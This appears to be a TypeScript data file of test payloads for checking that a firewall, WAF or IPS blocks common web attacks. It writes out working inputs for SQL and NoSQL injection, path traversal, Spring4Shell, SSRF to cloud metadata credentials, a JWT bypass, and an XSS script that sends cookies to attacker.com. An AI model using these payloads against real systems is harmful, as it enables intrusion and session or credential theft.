
import { TestPayload, TestCategory } from './types';

export const TEST_PAYLOADS: TestPayload[] = [
  // --- WAF / WEB APP ATTACKS ---
  {
    id: 'waf-sqli-01',
    name: 'SQLi: Tautology Bypass',
    description: 'Basic auth bypass attempt using standard SQL tautology.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' OR 1=1 --",
    expectedBehavior: '403 Forbidden or 406 Not Acceptable'
  },
  {
    id: 'waf-xss-01',
    name: 'XSS: Stored Script Injection',
    description: 'Injecting a script tag to steal sessions.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<script>alert('XSS_SUCCESS');document.location='http://attacker.com/steal?c='+document.cookie</script>",
    expectedBehavior: 'WAF Cross-Site Scripting Filter'
  },
  {
    id: 'waf-lfi-01',
    name: 'LFI: Path Traversal',
    description: 'Attempts to read /etc/passwd via traversal.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "../../../../../../../../etc/passwd",
    expectedBehavior: 'Directory Traversal Protection'
  },
  {
    id: 'waf-nosqli-01',
    name: 'NoSQLi: Operator Injection',
    description: 'Attempts to bypass authentication in MongoDB/NoSQL environments.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    expectedBehavior: 'JSON Schema/NoSQL Protection'
  },

  // --- IPS / INFRASTRUCTURE ---
  {
    id: 'ips-rce-spring',
    name: 'RCE: Spring4Shell (CVE-2022-22965)',
    description: 'Simulates the classloader manipulation pattern.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{payload}i",
    expectedBehavior: 'Critical RCE Signature'
  },
  {
    id: 'ips-ssrf-01',
    name: 'SSRF: Cloud Metadata Leak',
    description: 'Attempts to access internal AWS/GCP metadata service.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    expectedBehavior: 'SSRF / Internal Network Access Control'
  },

  // --- API SECURITY ---
  {
    id: 'api-graphql-01',
    name: 'API: GraphQL Introspection',
    description: 'Attempts to dump the entire API schema via introspection.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: "query { __schema { types { name fields { name } } } }",
    expectedBehavior: 'GraphQL Security Policy'
  },
  {
    id: 'api-jwt-01',
    name: 'API: JWT None Algorithm',
    description: 'Bypass auth using the "none" algorithm vulnerability.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaW52YWxpZCJ9.",
    expectedBehavior: 'API Protocol Validation'
  },

  // --- EVASION TECHNIQUES ---
  {
    id: 'evasion-ua-spoof',
    name: 'Evasion: Malicious User-Agent',
    description: 'Spoofs a known vulnerability scanner agent (sqlmap).',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "sqlmap/1.4.11#stable (http://sqlmap.org)",
    expectedBehavior: 'Bot / Scanner Detection'
  },
  {
    id: 'evasion-null-01',
    name: 'Evasion: Null Byte Injection',
    description: 'Attempts to terminate string checks using %00.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "/etc/passwd%00.jpg",
    expectedBehavior: 'Input Sanitization Validation'
  },

  // --- VIRUS / MALWARE ---
  {
    id: 'virus-eicar-zip',
    name: 'Virus: Compressed EICAR',
    description: 'EICAR test string inside a ZIP. Tests NGFW Recursive Scanning.',
    category: TestCategory.VIRUS,
    type: 'download',
    targetDevice: 'BOTH',
    content: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
    expectedBehavior: 'Blocked by Gateway AV'
  }
];
